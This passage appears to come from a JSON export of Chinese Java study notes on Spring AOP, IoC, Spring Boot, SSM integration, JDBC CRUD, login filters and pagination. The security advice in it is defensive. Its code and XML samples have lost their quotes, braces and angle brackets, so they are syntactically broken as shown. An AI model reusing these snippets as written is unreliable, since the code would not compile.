advice-ref=afterAdvice pointcut-ref=pointcut/ /aop:config aspect 配置aop:config aop:aspect ref=adviceAspect aop:pointcut id=pointcut expression=execution(* com.example.service.UserServiceImp.*(..))/ aop:before method=before pointcut-ref=pointcut/ aop:after method=after pointcut-ref=pointcut/ /aop:aspect /aop:config 代理只拦截经过代理对象的调用。对象内部的自调用通常绕过同一代理，因此事务或切面可能不会生效。 ApplicationContext从容器获取的对象已经完成依赖装配，并可能是代理对象： ApplicationContext context = new ClassPathXmlApplicationContext(applicationContext.xml);StudentController studentController = (StudentController) context.getBean(studentController);studentController.selectAll(); 容器负责以下工作： 对象已经提前由容器管理 依赖关系也已经提前装配完成 业务代码只需要拿来用 容器与代理边界事务管理、MyBatis 整合和 Spring MVC 都建立在容器装配与代理机制之上。 IOC DI 处理对象的创建与依赖关系，AOP 处理横切逻辑的组织方式。实际使用中还要区分容器 Bean 与普通 new 出来的对象：后者不会自动获得依赖注入、事务代理或 AOP 增强。","tags":[null,null]},{"title":"Java笔记45-SpringBoot快速入门","path":"/wiki/java/java-note-45.html","content":"版本边界： 示例未给出 Spring Boot 具体版本，应与项目 pom.xml 对照。Spring Boot 3 的基线为 Java 17，并使用 Jakarta EE 命名空间；Spring Boot 2 与 3 的依赖和配置不能直接互换。 Spring Boot 通过 Starter、自动配置和统一的外部配置约定，减少 Spring 应用的手工装配工作。 启动类Spring Boot 项目最经典的入口通常就是这样： @SpringBootApplication@MapperScan(com.java.springboot.mapper)public class Application public static void main(String[] args) SpringApplication.run(Application.class, args); 启动类负责引导自动配置、组件扫描和应用上下文创建： 注解 方法 作用 @SpringBootApplication 组合了配置类、自动配置、组件扫描等能力 @MapperScan 扫描 MyBatis Mapper 接口 SpringApplication.run(...) 启动 Spring Boot 应用 传统配置方式里很多在 XML 中完成的事情，从这里开始都被逐渐转移到注解和自动配置里了。 @SpringBootApplication启动类之所以能短，是因为 @SpringBootApplication 本身就是组合注解。它把 Spring Boot 应用启动时最常用的三件事压缩到一个入口里： 能力 作用 @SpringBootConfiguration 标记当前类是配置类，从机制上看仍然属于 Spring 配置体系 @EnableAutoConfiguration 开启自动配置，让框架根据依赖和条件装配常用 Bean @ComponentScan 从启动类所在包开始扫描组件 这里最容易踩到的是扫描范围。默认情况下，组件扫描会从启动类所在包向下扫描，所以启动类通常放在项目根包下。如果启动类位置太深，Controller、Service、Mapper 等组件可能不在扫描范围内，结果就是代码写了注解，容器里却没有对应 Bean。 自动配置也不是“无条件全部开启”。Spring Boot 通常会根据三个方面判断是否装配某个能力：classpath 中是否存在相关依赖、容器中是否已经存在同类 Bean、配置文件中是否提供了对应属性。比如加入 Web Starter 后，内置 Web 容器、Spring MVC 基础组件和 JSON 转换能力才会自然接上；加入 MyBatis Starter 后，Mapper 扫描、SqlSessionFactory、数据源绑定这些能力才有条件被整合起来。 配置文件配置文件中的关键项通常会集中在 application.properties 或 application.yml： spring.application.name=SpringBootserver.port=8081spring.datasource.driverClassName=com.mysql.cj.jdbc.Driverspring.datasource.url=jdbc:mysql://db-host:db-port/db-name?useSSL=falsecharacterEncoding=utf8spring.datasource.username=db-usernamespring.datasource.password=db-passwordmybatis.type-aliases-package=com.java.springboot.pojomybatis.mapper-locations=classpath:mapper/*Mapper.xmlmybatis.configuration.map-underscore-to-camel-case=true 配置项按服务器、数据源和 MyBatis 分组： 配置分组 作用 server.* Web 服务端口等运行参数 spring.datasource.* 数据源配置 mybatis.* MyBatis 集成配置 示例配置更适合使用这种占位写法，真实数据库地址、账号密码应放进本地配置、环境变量或密钥管理方案里，而不是直接出现在项目文档或代码仓库中。 分层结构控制层： @Controller@RequestMapping(/brand)public class BrandController @Autowired private BrandService brandService; @RequestMapping(/selectAll) @ResponseBody public ListBrand selectAll() return brandService.selectAll(); Service 层： @Servicepublic class BrandServiceImp implements BrandService @Autowired private BrandMapper brandMapper; @Override public ListBrand selectAll() return brandMapper.selectAll(); Mapper 接口： public interface BrandMapper ListBrand selectAll(); Mapper XML： mapper namespace=com.java.springboot.mapper.BrandMapper select id=selectAll resultType=Brand SELECT * FROM tb_brand /select/mapper Spring Boot 负责启动与装配，不会自动消除 Controller、Service 和 Mapper 的职责边界。 自动配置如果把传统 Spring + Spring MVC + MyBatis 项目和 Spring Boot 放在一起比较，最明显的差别通常有这些： 对比项 传统配置项目 Spring Boot 启动方式 容器 + XML 配置较多 main 方法直接启动 组件扫描 常常手工声明较多 自动扫描更集中 数据源配置 XML 或多处配置 统一进 application.properties MyBatis 整合 需要更多显式配置 约定式配置更集中 自动配置使用 classpath、现有 Bean 和配置属性等条件决定是否注册默认 Bean；应用自定义 Bean 时，部分默认配置会退让。 Starter 依赖Spring Boot 学习时经常会听到“起步依赖”这个词。它的意义不是一个新概念，而是把一类功能常用的依赖组合先打包好。 这样做有两个直接效果： 少写很多零散依赖 让自动配置有条件可判断 也就是说，Starter 负责把“需要哪些依赖”这件事先整理好，自动配置再负责决定“这些依赖该怎么配起来”。 Web 接口返回这一段控制器代码特别有代表性： @RequestMapping(/selectAll)@ResponseBodypublic ListBrand selectAll() return brandService.selectAll(); 这说明在 Spring Boot 里，接口返回 JSON 已经变成非常自然的写法。很多时候如果整个类都以接口返回为主，还会直接写成： @RestController 也就是说，Spring Boot 常常和“接口式开发”“前后端分离”“JSON 响应”这些开发习惯一起出现。 环境配置统一配置入口还可以承载： 多环境配置 端口切换 日志级别 数据源切换 文件上传限制 所以 application.properties 不只是“一个配置文件”，而是应用运行参数的主入口之一。 工程初始化以前做 Spring 项目时，很多精力会消耗在： XML 配置 组件注册 数据源整合 Web 层基础装配 Spring Boot 出现之后，这部分重复劳动被压缩了很多，于是开发者就能更快把注意力放回： 业务接口 数据处理 页面或接口输出 Spring Initializr 可以根据所选 Spring Boot 版本生成基础构建文件和目录，具体依赖仍需由项目维护。 自动配置边界Spring Boot 配置可以归纳为以下关系： 依赖选得对，自动配置就能接上 配置项放到规定位置，框架就知道去哪里找 大多数默认行为已经足够覆盖常见项目 需要个性化时，再去覆盖默认配置 自动配置减少默认场景的装配代码，但不会代替应用定义数据源凭据、事务边界、安全策略和接口契约。","tags":[null,null]},{"title":"Java笔记46-SSM整合项目","path":"/wiki/java/java-note-46.html","content":"版本边界： 以下为 XML 配置的传统 SSM 工程，用于说明两个 Spring 容器、Mapper 扫描和声明式事务的协作方式。Spring 6 Spring Boot 3 的默认工程结构不同。 SSM 工程由 Spring 管理对象和事务，Spring MVC 处理 HTTP 请求，MyBatis 执行 SQL 与结果映射。 SSM 的框架分工三套框架的职责如下： 框架 主要职责 Spring 管对象、管依赖、管事务 Spring MVC 接收请求、分发请求、返回页面或接口结果 MyBatis 执行 SQL、映射数据、管理持久层细节 SSM 整合的意义就在于：这三部分不再各跑各的，而是形成一条完整请求链。 web.xml 与两个容器在传统 SSM 工程里，web.xml 仍然是整合入口： listener listener-classorg.springframework.web.context.ContextLoaderListener/listener-class/listenercontext-param param-namecontextConfigLocation/param-name param-valueclasspath:applicationContext.xml/param-value/context-param servlet servlet-namespringmvc/servlet-name servlet-classorg.springframework.web.servlet.DispatcherServlet/servlet-class init-param param-namecontextConfigLocation/param-name param-valueclasspath:springmvc.xml/param-value /init-param/servletservlet-mapping servlet-namespringmvc/servlet-name url-pattern//url-pattern/servlet-mapping 这两段 XML 分别创建根容器与 Spring MVC 容器： 容器 典型职责 Spring 根容器 Service、Mapper、事务、数据源等基础能力 Spring MVC 容器 Controller、视图解析、拦截器、静态资源等 Web 能力 根容器和 Spring MVC 容器的扫描范围应保持清晰边界。根容器侧重扫描 Service、Mapper、数据源、事务等基础 Bean；MVC 容器侧重扫描 Controller 和 Web 相关配置。如果两个容器都扫描整个 com.java 包，Controller、Service 可能被重复创建，也会模糊事务、拦截器和依赖注入的边界。 根容器中的数据层配置根配置里关键的骨架通常就是下面这一组： context:property-placeholder location=classpath:db.properties/context:component-scan base-package=com.java/ bean id=dataSource class=com.mchange.v2.c3p0.ComboPooledDataSource property name=driverClass value=$jdbc.driver/ property name=jdbcUrl value=$jdbc.url/ property name=user value=$jdbc.username/ property name=password value=$jdbc.password//bean bean id=sqlSessionFactory class=org.mybatis.spring.SqlSessionFactoryBean property name=configLocation value=classpath:mybatis.xml/ property name=mapperLocations value=classpath:mapper/*.xml/ property name=dataSource ref=dataSource//bean 这一组配置存在以下初始化顺序： 先从独立配置文件读取数据库相关参数 再创建数据源 再把数据源交给 SqlSessionFactoryBean 最后让 MyBatis 和 Spring 连起来 示例配置里只保留 $jdbc.url 这类占位写法就足够了，真实数据库地址、账号和密码不适合出现在项目文档或代码仓库中。 Mapper 扫描整合 MyBatis 时，一个非常关键的配置是： bean class=org.mybatis.spring.mapper.MapperScannerConfigurer property name=basePackage value=com.java.mapper/ property name=sqlSessionFactoryBeanName value=sqlSessionFactory//bean 它解决的是一个很实际的问题： Mapper 接口本身不是普通实现类 但又希望像使用普通 Bean 一样去注入它们 MapperScannerConfigurer 就是在做这件事：扫描 Mapper 接口，自动创建代理对象，并把它们放进 Spring 容器。 事务配置在 SSM 整合中，Spring 除了负责 IOC，还常常直接承担事务管理角色： bean id=transactionManager class=org.springframework.jdbc.datasource.DataSourceTransactionManager property name=dataSource ref=dataSource//bean tx:advice id=txAdvice transaction-manager=transactionManager tx:attributes tx:method name=* propagation=REQUIRED/ tx:method name=select* propagation=SUPPORTS read-only=true/ tx:method name=query* propagation=SUPPORTS read-only=true/ tx:method name=get* propagation=SUPPORTS read-only=true/ tx:method name=find* propagation=SUPPORTS read-only=true/ /tx:attributes/tx:advice aop:config aop:advisor advice-ref=txAdvice pointcut=execution(* com.java.service.imp.*.*(..))/ /aop:config 事务通知通过方法名规则匹配 Service 方法： 方法类别 常见事务特征 查询方法 常设为只读，传播行为偏支持型 新增 删除 修改 一般需要事务，传播行为更强 这说明事务在 SSM 里已经不再是“DAO 自己处理”的事，而是上升到了 Service 层的统一规则。 事务管理器的 id 可以自定义，但引用时必须保持一致。示例中统一写成 transactionManager，能避免因为拼写差异让配置可读性下降。事务之所以挂在 Service 层，是因为一次业务动作经常不只调用一个 Mapper 方法。比如创建订单可能同时写订单表、订单明细表、扣减库存；这些数据库操作必须作为一个整体成功或失败。如果事务只散落在 Mapper 层，就很难表达这种“业务整体一致性”。 Spring MVC 配置Web 层配置主要的几块通常是： context:component-scan base-package=com.java.controller/mvc:annotation-driven/mvc:resources mapping=/static/** location=/static// bean class=org.springframework.web.servlet.view.InternalResourceViewResolver property name=prefix value=// property name=suffix value=.jsp//bean 这些配置组合起来后，Web 层会具备： Controller 扫描 注解驱动 JSON 参数绑定等基础支持 静态资源放行 JSP 视图解析 也就是说，Spring MVC 在 SSM 里承担的不是“写业务”，而是把请求层环境准备好。 拦截器与过滤器SSM 工程里，登录校验更常见的方式往往不是再写一层 Servlet 过滤器，而是使用拦截器： mvc:interceptors mvc:interceptor mvc:mapping path=/**/ mvc:exclude-mapping path=/auth/login/ mvc:exclude-mapping path=/auth/register/ mvc:exclude-mapping path=/static/**/ bean class=com.example.interceptor.LoginInterceptor/ /mvc:interceptor/mvc:interceptors 拦截器里的核心逻辑通常也很集中： public boolean preHandle(HttpServletRequest request,HttpServletResponse response,Object handler) throws Exception HttpSession session = request.getSession(false); Object currentUser = (session != null) ? session.getAttribute(currentUser) : null; if (currentUser != null) return true; response.sendRedirect(request.getContextPath() + /auth/login); return false; 两者的定位分别是： 技术 更擅长的层面 Filter 更贴近 Servlet 规范层 Interceptor 更贴近 Spring MVC 控制层 登录校验若只针对 Spring MVC 处理器，可以使用拦截器；需要覆盖静态资源、其他 Servlet 或容器级请求时仍应使用 Filter。二者不能简单互相替代。 MyBatis 的映射职责当它被接进 Spring 之后，MyBatis 自己的核心配置反而会更聚焦： settings setting name=logImpl value=STDOUT_LOGGING/ setting name=mapUnderscoreToCamelCase value=true//settingstypeAliases package name=com.java.pojo//typeAliases 这说明 SSM 整合后，MyBatis 主要专注在： SQL 映射 字段与对象映射 日志与结果映射细节 而数据源、事务、对象装配这些更外围的能力，已经被 Spring 接管了。 三层请求链配置完成后，一次典型请求经过以下调用链： 浏览器- DispatcherServlet- Controller- Service- Mapper- 数据库- 返回结果 这条链上各层职责如下： 层级 负责什么 Controller 接请求、收参数、决定返回什么 Service 做业务组合、挂事务边界 Mapper 执行 SQL、映射数据 Controller 不应直接操作数据库，Mapper 也不应承担跨多个数据操作的业务事务。 SSM 的版本位置SSM 的价值非常大，因为它把传统 Java Web 分层思想落成了一整套工程实践： Spring 负责容器和事务 Spring MVC 负责 Web 层 MyBatis 负责持久层 但它也会逐渐暴露一个特点：配置和整合成本还是偏重。于是后面才会顺势过渡到 Spring Boot。 SSM 是传统 Java Web 的常见工程结构，也提供了观察 Spring Boot 自动配置所替代装配工作的基线。迁移到 Spring Boot 时，容器边界、事务代理和 Mapper 生命周期仍然存在，只是配置入口发生变化。","tags":[null,null]},{"title":"Java笔记47-JDBC连接与工具类封装","path":"/wiki/java/java-note-47.html","content":"JDBC 工具类集中处理连接参数和连接创建；SQL 执行、结果映射与资源释放仍由调用方按操作范围管理。 JDBC 连接JDBC 基本流程包括获取连接、执行 SQL、处理结果和释放资源；JDBC 4 驱动通常通过服务提供者机制自动注册。 驱动、URL、用户名和密码可以放在 db.properties 中，JDBCUtil 负责读取配置并创建连接。凭据不应提交到公开仓库，部署环境可以改用环境变量或密钥管理服务注入。 Connection 与数据库会话Connection 表示数据库会话，建立过程可能涉及网络通信、认证和数据库端资源分配。应用通常通过 DataSource 和连接池获取连接，而不是在每次请求中直接新建物理连接。 手写 JDBC 工具类显式展示了以下过程： 环节 作用 加载驱动 让 JDBC 能找到对应数据库厂商的驱动实现 获取连接 建立 Java 程序到数据库的访问通道 创建 PreparedStatement 预编译 SQL，并通过占位符绑定参数 处理 ResultSet 把关系型数据转换成 Java 对象 关闭资源 释放数据库连接、语句对象和结果集 MyBatis 等持久层框架仍通过 JDBC 驱动与数据库交互，只是接管了参数绑定、结果映射和会话集成等重复工作。 工具类封装的重复操作JDBC 4 驱动位于类路径时通常会自动注册，连接工具可以直接调用 DriverManager： public static Connection getConnection() throws SQLException return DriverManager.getConnection(url, user, password); 旧版驱动或特殊类加载环境可能仍需显式加载驱动类，应按驱动文档确认。生产应用更适合注入 DataSource，以便配置连接池、超时和监控。 资源关闭顺序JDBC 代码里经常同时出现 ResultSet、PreparedStatement 和 Connection。这些资源存在依赖关系，因此释放时通常按创建的反方向关闭： ResultSet - PreparedStatement - Connection 调用代码不应在关闭连接后继续访问结果集。try-with-resources 可以按声明的逆序关闭资源，并且不会依赖工具类手工传入多个可空参数。 连接关闭这件事在连接池场景下还有一层特殊含义：调用 close() 往往不是物理断开数据库连接，而是把连接归还给连接池。也就是说，“关闭资源”从来不是可有可无的收尾动作，而是应用稳定运行的一部分。 工具类边界工具类可以封装稳定且无状态的连接创建逻辑，但不应把同一个 Connection 保存为全局共享对象。事务中的多次 DAO 调用必须使用同一连接；接入 Spring 后，这一关联通常由事务管理器完成。","tags":[null,null]},{"title":"Java笔记49-JDBC登录注册与过滤器","path":"/wiki/java/java-note-49.html","content":"登录模块通过 JDBC 查询账号，在 Servlet 中建立 Session，并由 Filter 对受保护请求执行认证检查。 登录注册与过滤器请求链为：表单提交 - Servlet 接收 - Service 校验 - Session 建立 - Filter 检查后续请求。Filter 负责认证状态检查，具体权限仍需根据用户角色和目标资源单独判断。 登录请求与会话状态HTTP 请求本身是无状态的。浏览器发起一次登录请求，服务器处理完之后，这次请求就结束了；如果没有额外机制，下一次访问时服务器并不能天然知道“这是谁”。Session 解决的就是这个问题。 登录成功后，服务器把用户信息放入 Session，浏览器后续通过 Cookie 携带会话标识回来，服务器再根据这个标识找到对应 Session。这样，登录状态就从单次请求延续到了后续请求。 登录表单- Servlet 接收账号密码- Service 校验用户- 查询数据库- 登录成功写入 Session- 后续请求通过 Filter 校验 Session Session Cookie 只携带会话标识，实际用户状态保存在服务器端。部署时还应配置 HttpOnly、Secure 和合适的 SameSite 属性。 表单、Session 与过滤器登录成功时只应把认证后所需的用户标识、名称和角色写入 Session，不应保存密码字段： User user = userService.login(username, password);if (user != null) HttpSession session = req.getSession(); session.setAttribute(user, user); resp.sendRedirect(req.getContextPath() + /index.jsp); else req.setAttribute(error, 用户名或密码错误); req.getRequestDispatcher(/login.jsp).forward(req, resp); 这段处理包含以下状态变化： 登录成功后把用户对象放入 session，后续请求就可以通过会话识别当前登录人。 过滤器统一拦截请求，避免每个业务 Servlet 都重复写登录校验代码。 登录成功后应更新会话标识，降低会话固定攻击风险。 集中处理登录校验如果没有过滤器，每个需要登录才能访问的 Servlet 都要写一次 Session 判断。这样不仅重复，而且很容易漏掉某个入口。过滤器把这类公共逻辑前置到请求进入业务 Servlet 之前： 请求进入- Filter 判断是否登录- 已登录则放行- 未登录则重定向到登录页 Filter 不负责查询业务数据或渲染页面，只在请求进入业务代码前执行统一检查。公开路径应使用明确的允许列表，避免把登录页和静态资源也拦截，同时不能因宽泛路径匹配放行受保护动作。 密码存储边界注册时应使用 Argon2、bcrypt、scrypt 或 PBKDF2 等专用密码哈希算法，并为每个密码生成独立盐值；登录时读取账号后使用算法提供的验证函数比较。密码原文不得写入日志、Session 或响应。 常见故障点退出登录应使 Session 失效。登录、注册、退出和其他状态修改请求还应有 CSRF 防护；登录接口需要失败次数限制，错误提示不应泄露账号是否存在。 传统会话登录适合 JSP、Servlet 这类服务器端页面项目。Spring MVC 可以在 Interceptor 中处理控制器访问规则，前后端分离接口也可以使用 Token 或 JWT。Filter、Interceptor 与 JWT 不是严格的替代顺序，应按请求入口、状态模型和部署方式选择。","tags":[null,null]},{"title":"Java笔记50-JDBC分页与JSP展示","path":"/wiki/java/java-note-50.html","content":"分页是传统后台项目中最常见的列表需求之一。它同时涉及 SQL、后端对象封装和 JSP 页面展示。 分页查询手写分页分别查询当前页数据和总记录数，再把列表、页码与总量封装进 PageInfo 交给 JSP。 SQL 截取与页面状态分页至少需要三个核心参数：当前页 pageNo、每页数量 pageSize、总记录数 totalCount。有了这些参数，才能继续计算偏移量和总页数。 offset = (pageNo - 1) * pageSizetotalPage = ceil(totalCount / pageSize) 在 MySQL 中，最常见的分页 SQL 形态是： SELECT *FROM tb_brandORDER BY idLIMIT ?, ? 第一个占位符对应偏移量，第二个对应页大小。排序字段应稳定且最好唯一，例如 ORDER BY created_at, id，否则相同排序值或并发写入可能造成跨页重复和遗漏。 查询结果与页面展示Service 根据页码计算偏移量，并组合两次 DAO 查询： int offset = (pageNo - 1) * pageSize;ListBrand list = branddao.getByPage(offset, pageSize);int totalCount = branddao.getTotalCount();int totalPage = (int) Math.ceil((double) totalCount / pageSize);PageInfo pageInfo = new PageInfo(list, totalPage, pageNo, pageSize); 计算过程包含三个结果： offset = (pageNo - 1) * pageSize 体现了 SQL 分页的核心换算关系。 PageInfo 把当前页数据、总页数、页大小等信息打包起来，便于 JSP 页面统一使用。 JSP 里的页码循环和上一页、下一页链接，说明分页最终还要落实到页面跳转逻辑。 pageNo 必须大于等于 1，pageSize 应设置上限，并防止偏移量整数溢出。总数查询和页面查询之间可能发生并发写入，因此两次结果不一定来自完全相同的数据快照。 PageInfo 分页对象如果只返回当前页列表，JSP 页面无法知道是否还有下一页，也无法知道总页数。PageInfo 这类对象的意义，就是把分页页面需要的状态统一封装起来： 字段 作用 list 当前页数据 pageNo 当前页码 pageSize 每页条数 totalCount 总记录数 totalPage 总页数 这样 Controller 只需要把一个分页对象交给 JSP，页面就能同时完成数据展示、页码渲染和上一页 下一页判断。 大偏移量分页手写分页时还需要知道一个更深入的点：LIMIT offset, pageSize 在数据量很大、页码很靠后时可能变慢，因为数据库需要跳过大量记录后再取当前页。后台管理系统早期可以先使用这种写法，但数据量继续增长时，就要结合索引、条件筛选，甚至改成基于游标或上一页最后一条记录的分页方式。 数据量较大时可以使用基于稳定游标的 keyset pagination，避免扫描并跳过大量前置记录，但它不适合任意跳转页码。 分页参数分页主要的几个参数是 pageNo、pageSize、offset、totalCount 和 totalPage。它们分别对应页面状态、SQL 截取位置和总页数计算，任何一个处理不清，页面展示都会出现错位。 PageHelper、MyBatis-Plus 等工具会封装 SQL 改写和分页对象，但固定排序、参数限制、总数成本和并发一致性仍需由应用处理。","tags":[null,null]},{"title":"Java笔记48-JDBC品牌管理CRUD","path":"/wiki/java/java-note-48.html","content":"品牌 CRUD 通过 DAO 执行查询、新增、修改和删除，Service 解释数据库结果，Servlet 处理请求与页面跳转。 品牌模块 CRUDBrandDaoImp、BrandServiceImp 和 BrandServlet 分别对应持久层、业务层和请求入口。列表、详情、新增、修改和删除共用这条调用链。 安全的数据修改四类操作对应不同的数据变化： 查询负责把数据库中的状态展示出来 新增负责把新的业务记录落库 修改负责改变已有记录的某些字段 删除负责让记录退出当前业务视野 Servlet 校验请求参数，DAO 使用参数绑定执行 SQL，Service 根据影响行数判断业务结果。 PreparedStatement 把 SQL 结构与参数值分开，避免把表单值直接拼入 SQL： String sql = insert into tb_brand(brand_name,company_name,ordered,description,status) values(?,?,?,?,?);PreparedStatement pr = conn.prepareStatement(sql);pr.setString(1, brand.getBrandName());pr.setString(2, brand.getCompanyName());pr.setInt(3, brand.getOrdered());pr.setString(4, brand.getDescription());pr.setInt(5, brand.getStatus()); 占位符只能绑定值，不能用于表名、列名或 SQL 关键字。动态标识符必须由服务端白名单映射。 DAO、Service 与 Servlet品牌模块一旦放进 Web 项目里，调用链就会非常清楚： 页面表单 / 链接- BrandServlet 接收请求- BrandServiceImp 组织业务动作- BrandDaoImp 执行 SQL- 数据库返回结果- Servlet 决定转发或重定向 DAO 层负责 SQL 和结果封装，Service 层解释业务含义，Servlet 层处理请求参数、页面跳转和结果反馈，避免把数据库访问和页面控制集中到同一个 Servlet。 JDBC 这一层的细节看起来繁琐，但也正因为它足够原始，才特别适合理解数据库访问的本来面目。后面换成连接池、DBUtils 或 ORM 框架时，每一层抽象到底封装了什么会更清楚。 影响行数CRUD 里要注意的，往往不是 SQL 能不能执行，而是执行之后到底有没有影响到预期数据。比如更新和删除通常会返回影响行数，这个值比“执行成功”四个字更有业务意义： 返回结果 常见含义 1 成功影响一条记录 0 没有匹配到目标数据；部分驱动配置下也可能表示值未变化 大于 1 批量操作或 SQL 条件过宽 DAO 返回影响行数，Service 再将其解释为“目标不存在”“操作成功”或“条件异常”。精确含义还受数据库和 JDBC 驱动的 affected rows 配置影响。 常见故障点新增和修改请求还应校验字段长度、数值范围与状态枚举；删除操作应使用合适的 HTTP 方法并加入 CSRF 防护。数据库唯一约束和外键约束负责并发条件下的最终一致性校验。","tags":[null,null]},{"title":"Java笔记53-Spring动态代理与AOP通知","path":"/wiki/java/java-note-53.html","content":"JDK 动态代理在运行时生成接口代理，AOP 使用切点和通知描述哪些方法调用需要增强。 动态代理与 AOPInvocationHandler 接收代理对象的方法调用，并负责调用目标方法。Spring AOP 的通知类型进一步区分方法执行前、正常返回后、抛出异常后和最终完成时的行为。 JDK 动态代理静态代理的问题在于代理类要手写。JDK 动态代理把这件事推迟到运行时完成：只要目标对象实现了接口，框架就可以根据接口动态生成一个代理对象。外部调用接口方法时，请求会先进入 InvocationHandler 的 invoke 方法，再由它决定是否调用目标方法以及前后要插入什么逻辑。 调用链如下： 调用代理对象的方法- 进入 InvocationHandler.invoke(...)- 执行前置增强- 反射调用目标方法- 执行后置增强- 返回结果 运行时生成的代理仍只暴露目标接口声明的方法。 AOP 概念与执行位置AOP 概念可以对应到方法调用链： 概念 含义 Join Point 可以被增强的位置，Spring AOP 中主要是方法执行 Pointcut 被选中的增强位置 Advice 在目标方法前后执行的增强逻辑 Aspect 切点和通知的组合 Proxy 承载增强逻辑的代理对象 比如日志打印是通知，匹配哪些 Service 方法是切点，把这两者组合起来就是切面。最终业务对象被代理后，外部调用的其实是代理对象。 通知、切点与代理对象前置通知可以读取方法、参数和目标对象信息： public void before(Method method, Object[] args, Object target) System.out.println(调用了 + method.getName() + 方法); 通知与代理的关系如下： InvocationHandler 的 invoke 方法统一接住所有目标方法调用，这是 JDK 动态代理的关键。 MethodBeforeAdvice 和 AfterReturningAdvice 体现了前置通知与后置通知的思想。 从“手写打印日志”到“配置通知”，这就是 AOP 化的过程。 后置返回通知只在目标方法正常返回后执行；需要覆盖异常或最终清理时，应使用对应通知类型。反射调用还会把目标异常包装为 InvocationTargetException，通用代理需要正确解包或传播。 JDK 代理与 CGLIBSpring AOP 常见代理方式主要有两类：目标对象有接口时，通常可以使用 JDK 动态代理；目标对象没有接口时，Spring 可以使用 CGLIB 这类基于子类的代理方式。两者最终目的都是生成代理对象，但实现路径不同。 这个边界很重要，因为它会影响一些细节：基于接口代理时，外部更适合面向接口编程；基于子类代理时，final 类或 final 方法会限制代理能力。理解这一点后，很多“为什么 AOP 没生效”的问题就能从代理机制上找到原因。 代理边界动态代理把“手工写代理类”变成了“运行时生成代理对象”，AOP 又进一步把通知、切点和切面抽象出来。这样一来，日志、事务、权限、性能统计都可以围绕方法调用统一处理。 外部调用拿到的可能是代理对象而非原始业务对象。Spring 的 AOP 与声明式事务依赖这种代理边界，自调用等绕过代理的路径也因此可能无法触发增强。","tags":[null,null]},{"title":"Java笔记51-SpringIOC与DI","path":"/wiki/java/java-note-51.html","content":"IOC 描述对象创建和控制权转移到容器，DI 是容器建立对象依赖关系的主要方式。 Spring IOC 与 DIStudentController - StudentService - StudentDao 构成一条依赖链。业务类声明所需接口，Spring 容器选择实现并完成装配。 对象创建权与容器在普通 Java 程序里，对象之间的依赖通常是手工建立的： StudentService service = new StudentServiceImp();StudentController controller = new StudentController();controller.setStudentService(service); 对象关系增多后，集中装配可以避免业务方法同时承担对象创建职责。 这带来的直接变化是： 对象之间的依赖关系从代码里移到容器配置中 上层组件只依赖抽象，不关心具体实现怎么实例化 生命周期可以由容器统一控制，而不是散落在各处手写 new 容器可以通过构造器、setter 或字段完成注入。必需依赖通常使用构造器注入，使对象在构造后保持完整，并便于单元测试。 Bean 生命周期Spring 管理的对象通常叫 Bean，但 Bean 不只是“一个被容器拿着的对象”这么简单。它从实例化到可以使用，中间还会经历属性填充、初始化、销毁等阶段。这个过程决定了很多框架能力为什么能挂到 Bean 上，比如： 初始化阶段可以加载必要资源 后置处理器可以参与 Bean 生成过程 销毁阶段可以释放连接、线程或缓存资源 Bean 生命周期使后置处理器能够包装对象或执行回调，也是 AOP 与声明式事务接入容器对象的基础。 代码中的依赖注入IOC 使三层对象的依赖关系由容器维护；代理机制则可将日志、事务等横切逻辑从业务方法中分离。下面的代码展示 Setter 注入对应的对象关系。 public class StudentController private StudentService studentService; public void setStudentService(StudentService studentService) this.studentService = studentService; Setter 注入包含以下关系： StudentController 中不再直接 new StudentServiceImp()，而是留下接口引用等待容器注入。 setStudentService(...) 这样的 setter 方法，就是典型的依赖注入入口。 applicationContext.xml 中的 bean 配置相当于告诉 Spring：对象怎么创建、对象之间怎么连起来。 只有由容器创建并经过后处理器的对象才会获得自动注入和代理增强；业务代码直接 new 出来的对象不具备这些能力。 IOC 与 DI 的职责XML、组件扫描和 Java 配置采用不同声明方式，但最终都会向容器注册 Bean 定义并建立依赖关系。存在多个同类型 Bean 时，还要通过名称、限定符或主 Bean 规则消除歧义。","tags":[null,null]},{"title":"Java笔记54-Spring注解开发与组件扫描","path":"/wiki/java/java-note-54.html","content":"组件注解声明候选 Bean，组件扫描负责发现并注册它们；依赖注入再根据类型、名称和限定符建立对象关系。 组件扫描@Controller、@Service、@Repository 和 @Component 标记组件角色；@Autowired 与 @Qualifier 描述依赖选择。没有组件扫描或显式导入时，仅添加注解不会自动注册 Bean。 Bean 的发现规则context:component-scan base-package=com.java/ 该配置扫描指定包及其子包，并把符合条件的组件注册为 Bean。 组件扫描的实际意义有三层： 省掉大量 bean 手工声明 让组件身份直接贴在类定义上 让包结构和系统分层更贴近 扫描范围过大可能让根容器和 MVC 子容器重复注册组件；传统 SSM 工程应分别限定 Service 与 Controller 的扫描范围。 依赖注入方式@Autowiredprivate StudentService studentService; @Resource(name = studentService)private StudentService studentService; @Autowired 默认按类型解析，可配合 @Qualifier 选择候选 Bean。@Resource 按名称优先、类型回退；其包名在旧项目中通常是 javax.annotation，Jakarta 版本则是 jakarta.annotation，必须与项目依赖匹配。 必需依赖更适合使用构造器注入；字段注入会隐藏构造依赖，也不便于脱离容器测试。 组件扫描的职责下面的配置指定组件扫描范围；被识别的组件会注册为 Bean，并参与后续依赖注入与代理处理。 context:component-scan base-package=com.java/ 配置产生以下效果： context:component-scan ... 的作用是告诉 Spring 去哪里找带注解的组件。 @Component 及其派生注解从机制上看都代表“把这个类交给 Spring 容器管理”。 组件扫描生效后，很多原来写在 XML 里的 bean 声明可以省略。 组件扫描负责注册候选 Bean，不保证所有依赖都能唯一解析；存在多个同类型实现时必须提供明确选择规则。 Bean 作用域与初始化@Scope 可以改变 Bean 作用域，@PostConstruct 和 @PreDestroy 可以声明生命周期回调。容器不会自动调用 prototype Bean 的销毁回调，相关资源仍需由使用方管理。 扫描与生命周期边界注解开发让 Bean 声明和依赖注入更贴近代码，但它并没有改变 Spring 的底层逻辑。组件仍然要进入容器，依赖仍然要完成装配，Bean 生命周期仍然存在。 注解开发仍依赖组件扫描和 Bean 注册。Spring Boot 默认从启动类所在包向下扫描，因此启动类位置和包边界会直接影响组件是否进入容器。","tags":[null,null]},{"title":"Java笔记56-SSM用户登录与权限拦截","path":"/wiki/java/java-note-56.html","content":"传统 SSM 登录由 Controller 接收凭据，Service 验证身份，Session 保存认证状态，拦截器检查受保护的 Controller 请求。 登录校验与会话建立控制层可以按以下方式建立 Session： @PostMapping(/login)public String doLogin(@RequestParam String username,@RequestParam String password,Model model,HttpSession session) User user = userService.login(username, password); if (user == null) model.addAttribute(error, 用户名或密码错误); return login; 